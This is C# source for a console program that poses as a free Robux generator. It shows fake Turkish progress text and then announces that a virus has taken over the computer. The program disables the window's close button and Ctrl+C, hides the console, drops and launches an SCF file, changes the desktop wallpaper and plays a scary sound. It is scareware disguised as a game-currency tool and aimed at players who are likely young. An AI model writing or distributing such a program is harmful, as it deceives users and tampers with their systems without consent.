using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WMPLib;

namespace Free_Robux
{
    internal class Program
    {
        private const int MF_BYCOMMAND = 0x00000000;
        public const int SC_CLOSE = 0xF060;

        [DllImport("user32.dll")]
        public static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        static string path = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
        static string wallpaperPath = Path.Combine(path, "wallpaper.jpg");

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;
        private const uint SPIF_SENDWININICHANGE = 0x2;
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        private static void DisplayPicture(string file_name)
        {
            uint flags = 0;
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0, file_name, flags))
            {
                Console.WriteLine("Error");
            }
        }
        static void FocusToDesktop()
        {
            File.WriteAllBytes("switch.SCF", Properties.Resources.test);
            Process.Start("switch.SCF");
        }
        static void GenerateRobux()
        {
            Console.CancelKeyPress += Console_CancelKeyPress;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Clear();
            Console.WriteLine("Sunucuya İstek Gönderiliyor %0");
            Properties.Resources.wallpaper.Save(wallpaperPath);
            for(int i = 0; i < 101; i++)
            {
                Console.Clear();
                Console.WriteLine("Sunucuya İstek Gönderiliyor %" + i.ToString());
                Thread.Sleep(10);
            }
            Thread.Sleep(3000);
            for(int i = 0; i < 101; i++)
            {
                Console.Clear();
                Console.WriteLine("Hesabınıza Robux Yükleniyor. %" + i.ToString());
                Thread.Sleep(10);
            }
            Thread.Sleep(2000);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("İşlem Başarısız!");
            Console.ForegroundColor = ConsoleColor.Red;
            Thread.Sleep(2000);
            Console.WriteLine("...");
            Thread.Sleep(1500);
            Console.WriteLine("Gerçekten Bu Kadar İşlevsiz Bir Programla Robux Alacağını Mı Sandın");
            Thread.Sleep(2000);
            Console.WriteLine("Bedava Robux Diye Bir Şey Gerçek Değildir.");
            Thread.Sleep(1500);
            Console.Clear();
            Console.Write("Ama Ne Gerçektir Biliyor Musun? ");
            Thread.Sleep(2000);
            Console.WriteLine("Bilgisayarını Ele Geçirmiş Olan Bu Virüs.");
            Thread.Sleep(1000);
            Console.Clear();
            Console.Write(Properties.Resources.Death_Note);
            Thread.Sleep(500);
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            FocusToDesktop();
            DisplayPicture(wallpaperPath);
            WindowsMediaPlayer player = new WindowsMediaPlayer();
            File.WriteAllBytes("Death.mp3", Properties.Resources.SoundOfDeath);
            player.URL = "Death.mp3";
            player.controls.play();
            Console.ReadKey();
        }

        private static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            e.Cancel = true;
        }

        static void Main(string[] args)
        {
            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), SC_CLOSE, MF_BYCOMMAND);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("Kullanıcı Adınız: ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("Robux: ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.ReadLine();
            GenerateRobux();
        }
    }
}
